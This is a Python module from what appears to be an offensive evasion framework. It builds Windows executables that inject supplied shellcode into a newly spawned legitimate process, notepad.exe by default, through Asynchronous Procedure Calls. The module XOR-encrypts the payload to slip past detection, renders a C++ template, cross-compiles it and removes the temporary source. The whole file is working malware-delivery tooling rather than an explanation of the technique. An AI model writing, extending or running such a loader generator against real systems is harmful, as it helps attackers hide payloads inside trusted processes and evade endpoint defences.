import os
from jinja2 import Environment, FileSystemLoader
from core import EvasionTechnique
from utils.compiler import cross_compile_cpp
from utils.obfuscator import xor_encrypt
from utils.helpers import format_shellcode_to_hex, get_output_path
from config import TEMPLATE_DIRS

class APCInjection(EvasionTechnique):
    def __init__(self):
        super().__init__(
            name="apc-injection",
            description="Injects shellcode into a newly created process using Asynchronous Procedure Calls (APC).",
            options=[
                {'name': '--payload', 'type': 'str', 'required': True, 'help': 'Path to the raw shellcode file.'},
                {'name': '--process', 'type': 'str', 'required': False, 'default': 'C:\\Windows\\System32\\notepad.exe', 'help': 'Full path of the legitimate process to spawn and inject into (e.g., notepad.exe).'},
                {'name': '--output', 'type': 'str', 'required': True, 'help': 'Name of the output executable file.'}
            ]
        )

    def generate(self, **kwargs):
        payload_path = kwargs['payload']
        target_process_path = kwargs['process']
        output_filename = kwargs['output']

        print(f"[*] Starting APC Injection artifact generation for target: '{target_process_path}'")

        # 1. Read shellcode
        try:
            with open(payload_path, 'rb') as f:
                shellcode = f.read()
        except FileNotFoundError:
            print(f"[!] Error: Payload file '{payload_path}' not found.")
            return
        except Exception as e:
            print(f"[!] Error reading payload file '{payload_path}': {e}")
            return

        if not shellcode:
            print(f"[!] Error: Payload file '{payload_path}' is empty.")
            return

        # 2. Obfuscate shellcode (XOR is simple and effective for this)
        encrypted_shellcode, key = xor_encrypt(shellcode)
        hex_shellcode = format_shellcode_to_hex(encrypted_shellcode)
        print(f"[*] Shellcode obfuscated with XOR key: {key}")

        # 3. Render C++ template
        # Ensure the C++ template name matches what's expected, e.g., "apc_injection.cpp"
        # The template will need placeholders for {{ shellcode_hex }}, {{ xor_key }}, and {{ target_process_str }}
        env = Environment(loader=FileSystemLoader(TEMPLATE_DIRS), trim_blocks=True, lstrip_blocks=True)
        try:
            # The user prompt had "apc_injection.py.cpp" which seems like a typo, should be "apc_injection.cpp"
            template = env.get_template("apc_injection.cpp") 
            cpp_target_process_path = target_process_path.replace('\\', '\\\\') # Escape backslashes for C++ string

            cpp_code = template.render(
                shellcode_hex=hex_shellcode,
                xor_key=key,
                target_process_str=cpp_target_process_path
            )
        except Exception as e:
            print(f"[!] Error rendering C++ template (apc_injection.cpp): {e}")
            return

        # 4. Compile the C++ code
        temp_dir = "/tmp" 
        if not os.path.exists(temp_dir):
            try:
                os.makedirs(temp_dir)
            except OSError as e_mkdir:
                print(f"[!] Error creating temp directory {temp_dir}: {e_mkdir}. Using current directory.")
                temp_dir = "."
        
        temp_source_path = os.path.join(temp_dir, f"{output_filename}.cpp")
        
        try:
            with open(temp_source_path, 'w') as f:
                f.write(cpp_code)
        except Exception as e:
            print(f"[!] Error writing temporary C++ source file '{temp_source_path}': {e}")
            return
        
        final_output_path = get_output_path(output_filename)
        print(f"[*] Compiling APC Injection executable: {output_filename}...")
        if not cross_compile_cpp(temp_source_path, final_output_path):
            print(f"[!] APC Injection executable '{output_filename}' compilation failed. Check logs. Temp source: {temp_source_path}")
            # Optionally keep temp_source_path for debugging
            return
        # print(f"[+] APC Injection executable compiled successfully: {final_output_path}") # Printed by compiler.py
        
        # 5. Cleanup
        try:
            if os.path.exists(temp_source_path):
                os.remove(temp_source_path)
        except Exception as e:
            print(f"[!] Warning: Failed to remove temporary source file '{temp_source_path}': {e}")

        if os.path.exists(final_output_path):
            print(f"[SUCCESS] APC Injection executable generated successfully: {final_output_path}")
        else:
            print(f"[!] APC Injection executable generation failed. Output file not found at {final_output_path}")
